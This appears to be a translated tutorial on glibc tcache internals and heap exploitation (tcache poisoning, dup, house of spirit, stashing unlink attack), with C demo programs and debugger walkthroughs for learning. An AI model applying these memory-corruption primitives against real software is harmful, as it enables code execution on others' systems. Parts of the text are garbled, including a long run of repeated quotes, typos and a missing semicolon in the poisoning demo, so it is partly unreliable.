# Tcache Attack

## Tcache Overview

The tcache mechanism is a technology introduced after `glibc 2.26`. In the tcache` mechanism, it creates a cache for each thread, which contains some small heap blocks, and can be used without locking the `arena`. This lock-free allocation algorithm improves the performance of the heap manager, but abandons a lot of security checks and adds a lot of utilization methods.

`tcache` is enabled by default in `glibc`. When `tcache` is enabled, the following things will be defined.

```c
#if USE_TCACHE
/* We want 64 entries. This is an arbitrary limit, which tunes can reduce. */
# define TCACHE_MAX_BINS 64
# define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)
/* Only used to pre-fill the tunables. */
# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)
/* When "x" is from chunksize(). */
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
/* When "x" is a user-provided size. */
# define usize2tidx(x) csize2tidx (request2size (x))
/* With rounding and alignment, the bins are...
   idx 0 bytes 0..24 (64-bit) or 0..12 (32-bit)
   idx 1 bytes 25..40 or 13..20
   idx 2 bytes 41..56 or 21..28
   etc. */
/* This is another arbitrary limit, which tunables can change. Each
   tcache bin will hold at most this number of chunks. */
# define TCACHE_FILL_COUNT 7
/* Maximum chunks in tcache bins for tunables. This value must fit the range
   of tcache->counts[] entries, else they may overflow. */
# define MAX_TCACHE_COUNT UINT16_MAX
#endif
```

`tcache` reserves a special `bins` for each thread, and the number of `bins` is `64`. Each `bin` has a maximum of `7 `chunks`, which are incremented by `0x10` bytes on the `64-bit system, incremented from `24` to `1032` bytes, and from `12` to `512` bytes on the `32`bit system, so `tcache` caches non-Large Chunk` chunks.

Two new structures have been added to tcache to manage bins in tcache, namely `tcache_entry` and `tcache_perthread_struct`

- `tcache_entry` structure

```c
/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees. */
  uintptr_t key;
} tcache_entry;
```

`tcache_entry` is used to link an idle `chunk` structure, and the `next` pointer in `tcache_entry` is used to point to the next `chunk of the same size

Unlike `fastbin`, `next` in `tcache_entry` points to the data of the chunk` structure, and `fd` of `fastbin` points to the address at the beginning of the chunk` structure. In addition, `tcache_entry` will reuse the `data` part of the free block.

![](images/1.png#pic_center)

- `tcache_perthread_struct` structure

```c
/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */

typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache = NULL;
```

`tcache_perthread_struct` is used to manage `tcache` linked list, at the beginning of the heap, with a size of `0x251`, which allocates a total `bin` management structure for each thread, containing two fields
- `counts`: record the number of idle chunks on the tcache_entry` chain, with up to 7 chunks on each chain
- `entries`: Use a single linked list to link the `free` of the same size and then the `chunk` is idle after being linked to the `free` of the same size.

![](images/2.png#pic_center)

In the relationship diagram of `tcache_perthread_struct`, `tcache_entry` and `malloc_chunk`, it can be seen that the original `fd` field corresponding to `chunk` is in `tcache`, the next field of `tcache_entry` is filled in to index pointer to the next `chunk` in `tcache`

## Tcache Usage

`tcache` execution process
- When `malloc` is the first time, a piece of memory of `malloc` will be used to store `tcache_perthread_struct`. The memory size is generally `0x251`
- When releasing chunk, if the chunk` size is less than `small bin size`, it will be put into `fastbin` or `unsorted bin` before entering `tcache`
- After putting in `tcache`
  - Put it in the corresponding `tcache` first until `tcache` is filled
  - After `tcache` is filled, then release `chunk`. At this time, `chunk` will be placed directly in `fastbin` or `unsorted bin`
  - `chunk` in `tcache` will not merge, and `inuse bit` will not be canceled
- Then reapply for `chunk`, and the size of the applied `tcache`, first take `chunk` from `tcache` until `tcache` is empty
- When tcache is empty, find the chunk that matches the chunk from `bin`. If there is a chunk that matches the size in `fastbin`, `small bin` and `unsorted bin`, `chunk` in `fastbin`, `small bin` and `unsorted bin`, will first put the chunk in `tcache` until it is filled, and then get the chunk from `tcache`

- `tcache` initialization operation

```c
static void
tcache_init(void)
{
  mstate ar_ptr;
  void *victim = 0;
  const size_t bytes = sizeof (tcache_perthread_struct); // Get the number of bytes required by malloc
  if (tcache_shutting_down)
    return;
  arena_get (ar_ptr, bytes);
  victim = _int_malloc (ar_ptr, bytes); // Use malloc to allocate memory for the tcache_perthread_struct structure
  if (!victim && ar_ptr != NULL)
    {
      ar_ptr = arena_get_retry (ar_ptr, bytes);
      victim
= _int_malloc (ar_ptr, bytes);
    }
  if (ar_ptr != NULL)
    __libc_lock_unlock (ar_ptr->mutex);
  /* In a low memory situation, we may not be able to allocate memory
     - in which case, we just keep trying later. However, we
     Typically do this very early, so either there is sufficient
     memory, or there isn't enough memory to do non-trivial
     allocations anyway. */
  if (victim)
    {
      tcache = (tcache_perthread_struct *) victim; // Store
      memset (tcache, 0, sizeof (tcache_perthread_struct)); // Clear
    }
}
```

- Memory application. When there is chunk in tcache, determine whether the size of chunk to be retrieved meets the legal scope of idx. When tcache->entries` is not empty, call the tcache_get function to obtain chunk`

```c
void *
__libc_malloc (size_t bytes)
{
    ...
#if USE_TCACHE
    /* int_free also calls request2size, be careful to not pad twice. */
    size_t tbytes = request2size (bytes);
    size_t tc_idx = csize2tidx (tbytes);

    MAYBE_INIT_TCACHE ();

    DIAG_PUSH_NEEDS_COMMENT;
    if (tc_idx < mp_.tcache_bins
        /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appear gcc */
        && tcache
        && tcache->entries[tc_idx] != NULL)
        {
        return tcache_get (tc_idx);
        }
    DIAG_POP_NEEDS_COMMENT;
#endif
    ...
}
```

- `tcache_get` function, which gets a `chunk` pointer from `tcache->entries[tc_idx]` and then `tcache->counts` one, without too much security check or protection

```c
/* Caller must ensure that we know tc_idx is valid and there's
available chunks to remove. */
static void *
tcache_get (size_t tc_idx)
{
    tcache_entry *e = tcache->entries[tc_idx];
    assert (tc_idx < TCACHE_MAX_BINS);
    assert (tcache->entries[tc_idx] > 0);
    tcache->entries[tc_idx] = e->next;
    --(tcache->counts[tc_idx]);
    return (void *) e;
}
```

- Memory release, first determine the legality of `tc_idx`. When `tcache->counts[tc_idx]` is less than `7`, call the `tcache_put` function, and pass the `chunk` pointer`p` and `tc_idx` to be released at the same time.

```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
    ...
#if USE_TCACHE
{
    size_t tc_idx = csize2tidx (size);

    if (tcache
        && tc_idx < mp_.tcache_bins
        && tcache->counts[tc_idx] < mp_.tcache_count)
    {
        tcache_put (p, tc_idx);
        return;
    }
}
#endif
    ...
}
```

- `tcache_put` function, which inserts the released `chunk` into the head of `tcache_entries`, and then adds `tcache_counts[tc_idx]`. No security checks and protection measures were done during the entire insertion process, nor did the flag `P` be set to `0`

```c
/* Caller must ensure that we know tc_idx is valid and there's room
for more chunks. */
static void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
    assert (tc_idx < TCACHE_MAX_BINS);
    e->next = tcache->entries[tc_idx];
    tcache->entries[tc_idx] = e;
    ++(tcache->counts[tc_idx]);
}
```

## Pwn Tcache
### tcache poisoning

The attack method of `tcache poisoning` is to override the `next` member variable in `tcache`. Since `tcache_get` function does not check `next`, when the address in `next` is replaced, there is no need to forge any `chunk` structure to implement `malloc` to any address.

- `tcache poisoning demo`

```c
// gcc -fno-stack-protector -no-pie -g tcache-poisoning-demo.c -o tcache-poisoning-demo
// patchelf --set-interpreter /home/h3rmesk1t/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 --set-rpath /home/h3rmesk1t/glibc-all-in-one/libs/2.27-3ubuntu1_amd64 tcache-poisoning-demo

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	size_t stack_var;
	printf("The address we want malloc() to return is %p.\n", (char *)&stack_var);

	intptr_t *a = malloc(128);
	printf("malloc(128): %p\n", a);
	intptr_t *b = malloc(128);
	printf("malloc(128): %p\n", b);

	free(a);
	free(b);

	b[0] = (intptr_t)&stack_var;

	malloc(128)
	intptr_t *c = malloc(128);
	printf("2nd malloc(128): %p\n", c);

	assert((long)&stack_var == (long)c);
	return 0;
}
```

In the above example code
- First use the `setbuf` function for initialization, and then define a `target` variable
- Next, two chunks with `size` of `0x90` (`128+16`) were applied. The two `malloc` pointers gave the pointer variable `a` and the pointer variable `b` respectively.
- Next, release `chunk_a`, then release `chunk_b`, and then modify the pointer array `b[idx]` subscript `0` to the address of the `target` variable
- Then two chunks with size of `0x90` were reapplied, and the `malloc` pointer of the `chunk` that was applied later was assigned to the pointer variable `c`
- Finally print out the pointer variable `c`

First check the address of `stack_var`, which is `0x7ffffffffde30`

![](images/3.png#pic_center)

Then check the addresses of pointer `a` and pointer `b`, respectively `0x405250` and `0
x4052e0`

![](images/4.png#pic_center)

Then check the internal situation of chunk after `free`, and you can see that the `fd` pointer of chunk_b` is actually pointing to the `malloc` pointer of chunk_a`

![](images/5.png#pic_center)

Then modify the address pointed to by the `chunk_b` pointer to the `fd` address of `stack_var`, so that the `chunk_b`' fd` from the original `chunk_a` to the address pointed to `stack_var`

![](images/6.png#pic_center)

Finally, I applied for `0x90` size `chunk` twice, and you can see that the `stack_var` that was hung in `tcache bin` was re-enabled as a release `chunk`

![](images/7.png#pic_center)

![](images/8.png#pic_center)

### tcache dup

The attack method of `tcache dup` is caused by the failure of security checks on the `tcache_put` function.

The `tcache_put` function will hang the released chunk into the tcache bins` link list according to the `idx` corresponding to `size`. The insertion process is also very simple. According to the parameters passed in the `_int_free` function, the `malloc` pointer of the released block is handed to the `next` member variable. There is no security check or protection mechanism in this process, so the same chunk can be `free` multiple times, resulting in a `cycliced ​​list`

```c
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

- `tcache dup demo`

```c
// gcc -fno-stack-protector -no-pie -g tcache-dup-demo.c -o tcache-dup-demo
// patchelf --set-interpreter /home/h3rmesk1t/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 --set-rpath /home/h3rmesk1t/glibc-all-in-one/libs/2.27-3ubuntu1_amd64 tcache-dup-demo

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	int *a = malloc(16);
	
	free(a);
	free(a);
	
	void *b = malloc(16);
	void *c = malloc(16);
	
	printf("Next allocated buffers will be same: [ %p, %p ].\n", b, c);

	assert((long)b == (long)c);
	return 0;
}
```

In the above example code
- First create a `0x20` size `chunk` and assign the `malloc` pointer of `chunk` to the pointer variable `a`
- Then `free` twice in a row`chunk_a`
- Then `malloc`two `chunks of size `0x20` were re-assigned, and the `chunk`' pointer to the pointer variable `b` and pointer variable `c` were respectively assigned to the pointer variable `b` and the pointer variable `c`.
- Last prints the `malloc` pointer of `chunk_b` and `chunk_c`

First check the address of `chunk_a`, which is `0x405250`

![](images/9.png#pic_center)

Then check the internal situation of chunk after `free` twice, you can see that the `chunk_a`'s `fd` is pointing to its own `malloc` address, which causes `cycliced ​​list`

![](images/10.png#pic_center)

Next, apply for two `0x20` size `chunk`, you can see that the printed `chunk_b` and `chunk_c` are both `malloc` pointers of `chunk_a`

![](images/11.png#pic_center)

### tcache house of spirit

The attack method of `tcache house of spirit` is caused by the failure of security checks on the `tcache_put` function.

Since the tcache_put function does not check whether the released pointer is really a `malloc` pointer of the heap block when it is released, if a `size` conforming to `tcache bin size` is constructed, then theoretically, any address can be released as `chunk`

- `tcache house of spirit demo`

```c
// gcc -fno-stack-protector -no-pie -g tcache-house-of-spirit-demo.c -o tcache-house-of-spirit-demo
// patchelf --set-interpreter /home/h3rmesk1t/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 --set-rpath /home/h3rmesk1t/glibc-all-in-one/libs/2.27-3ubuntu1_amd64 tcache-house-of-spirit-demo

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	malloc(1);

	unsigned long long *a;
	unsigned long long fake_chunks[10];

	printf("fake_chunk addr is %p\n", &fake_chunks[0]);

	fake_chunks[1] = 0x40;

	a = &fake_chunks[2];
	free(a);

	void *b = malloc(0x30);
	printf("malloc(0x30): %p\n", b);

	assert((long)b == (long)&fake_chunks[2]);
	return 0;
}
```

In the above example code
- First use the `setbuf` function for initialization, and then create a heap block (preventing the `chunk` from merging the subsequent `top chunk`)
- Then define a pointer variable `a` and an integer array `fake_chunks`, and then print out the starting address of `fake_chunk`
- Then change the content of `fake_chunk[1]` to 0x40, and assign the address where `fake_chunk[2]` to the pointer variable `a`, and then `free` drop`a`
- Finally re-malloc`a chunk` of size `0x30` and assign the `malloc` address to the pointer variable `b`

First check the address of `fake_chunks`, which is `0x7ffffffffdde0`

![](images/12.png#pic_center)

Then check the modified `fake_chunks` status

![](images/13.png#pic_center)

Then check the tcache bin after `free` drops`a`, and you can see that `fake_chunk` has been hung into `tcache bin`

![](images/14.png#pic_center)

![](images/15.png#pic_center)

Then check the chunk_b of `malloc` and you can see that the chunk_b of `chunk_b` is the `malloc` address of `fake_chunk`

![](images/16.png#pic_center)

### tcache stashing unlink attack

The attack method of `tcache stashing unlink attack uses the remaining method in `tcache bin` (the number is less than `TCACHE_MAX_BINS`), the small bin of the same size will be put into `tcache` (when there are free blocks in `small bin`, other free blocks of the same size will be placed into `tcache` at the same time). In this case, you can use `calloc` to allocate heap blocks of the same size to trigger, because `cache` is not selected from `tcache bin` when allocating heap blocks. After obtaining a `chunk` in a `small bin`, if `tcache` still has enough free space, the remaining small will be placed. bin`hooked into `tcache`, and in this process, only the first `bin` is checked for integrity, and the subsequent heap blocks are missing.

When an attacker can modify a `small bin``bk`,
It can be implemented to write a `libc` address on any address. If the configuration is appropriate, you can also assign `fake_chunk` to any address.

- `tcache stashing unlink attack demo`

```c
// gcc -fno-stack-protector -no-pie -g tcache-stashing-unlink-attack-demo.c -o tcache-stashing-unlink-attack-demo
// patchelf --set-interpreter /home/h3rmesk1t/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 --set-rpath /home/h3rmesk1t/glibc-all-in-one/libs/2.27-3ubuntu1_amd64 tcache-stashing-unlink-attack-demo


#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    setbuf(stdout, NULL);
	
	printf("stack_var addr is:%p\n",&stack_var[0]);
	printf("chunk_lis addr is:%p\n",&chunk_lis[0]);
	printf("target addr is:%p\n",(void*)target);
	
    stack_var[3] = (unsigned long)(&stack_var[2]);

    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    free(chunk_lis[1]);
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    malloc(0xa0);
    malloc(0x90);
    malloc(0x90);

    chunk_lis[2][1] = (unsigned long)stack_var;
    calloc(1,0x90);

    target = malloc(0x90);
    printf("target now: %p\n",(void*)target);

    assert(target == &stack_var[2]);
    return 0;
}
```

In the above example code
- Created an integer array `stack_var`, a pointer array `chunk_lis` and a pointer target`
- Then call the `setbuf` function for initialization, print the addresses of `stack_var`, `chunk_lis` and `targey` respectively
- Then put the address where `stack_var[2]` is located in `stack_var[3]`
- Then loop to create nine chunks of size `0xa0` and put the `malloc` pointers of nine chunks into `chunk_lis` in sequence
- Then release six chunks in loop, and then release the chunks pointed to by the malloc pointer in chunk_lis[1], chunk_lis[0], and chunk_lis[2] in sequence
- Then there are three chunks in succession, namely `0xb0`, `0xa0` and `0xa0` sizes respectively
- Then modify the content in the `chunk_lis[2][1]` position to the starting address of `stack_var`, and then call the `caloc` function to apply for a `0xa0` size `chunk`
- Finally, apply for a `0xa0` size `chunk` and assign its `malloc` pointer to the `target` variable, print `target`

First check the addresses of `stack_var`, `chunk_lis` and `targey`, respectively, `0x7ffffffffdd90`, `0x7ffffffffd10` and `0x7ffffffffdf00`

![](images/17.png#pic_center)

Then check the situation in `bin` after two `for` loops

![](images/18.png#pic_center)

![](images/19.png#pic_center)

At this time, there are only 6 released blocks in the tcache link list, but the maximum value of the number of released blocks stored in the tcache link list is `7`, so at this time `tcache` is not full, and then release `chunk_lis[1]`, `chunk_lis[0]`, and `chunk_lis[2]` in sequence, and check the situation in `bin` again.

![](images/20.png#pic_center)

It can be seen that when `chunk_lis[1]` is released, `chunk2` is the last `chunk` that enters `tcache`, will fill the entire linked list. Next, when the heap block with size of `0xa0` is released, it will not enter this one-way linked list again. Since the `chunk`s size pointed to by `chunk_lis[0]` and `chunk_lis[2]` are both `0xa0`, which exceeds `fastbin max size`, it will enter `unsorted bin`. As shown in the figure above, `chunk1` and `chunk3` have entered `unsorted bin` at this time.

Due to the `unsorted bin` access mechanism, if a `0xb0` size `chunk` is applied for at this time, if there is no free block in the `unsorted bin that meets the `chunk size` (the `size` of `chunk3` and `chunk1` are less than `0xb0` size), then the free blocks `chunk3` and `chunk1` in the `small bin` will fall into the `0xa0` list of `small bin` according to the `size`. Next, two applications will be completed.

At this time, the `tcache bin` has an idle block with a size of `0xa0`, so `chunk2` and `chunk4` are re-activated, and `5 free blocks in `tcache bin` are formed, and `2 free blocks in `small bin` are present.

![](images/21.png#pic_center)

![](images/22.png#pic_center)

Then execute `chunk_lis[2][1] = (unsigned long)stack_var;`, the position of `chunk_lis[2]` is the position where the `chunk3`''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

![](images/23.png#pic_center)

Then call the `calloc` function to apply for a `chunk` with size of `0xa0`. Since `calloc` will not pick up free blocks from `tcache bin` when applying for `chunk`, the free chunk` will be directly obtained from `small bin`. Due to the `small bin`` FIFO mechanism, the `chunk1` is obtained.

![](images/24.png#pic_center)

After obtaining a chunk in a `small bin`, if `tcache` still has enough free positions (there are two free positions in `tcache` at this time, `chunk3` and `stack_var` are just enough to land in these two positions), the remaining `small bin` starts to link to `tcache bin along the last `stack_var(0x7ffffffddf0)` with `bk`. In this process, only the first `chunk3` is checked for integrity, and the subsequent `stack_var` is missing, which results in the effect of the above picture. `stack_var` is hung into the `tcache bin` linked list.

Finally, use `malloc` to apply for a `0xa0` size `chunk`, and at this time, the free `chunk` will be retrieved from `tcache bin`, and the `stack_var` will be re-enabled.

![](images/25.png#pic_center)

### libc leak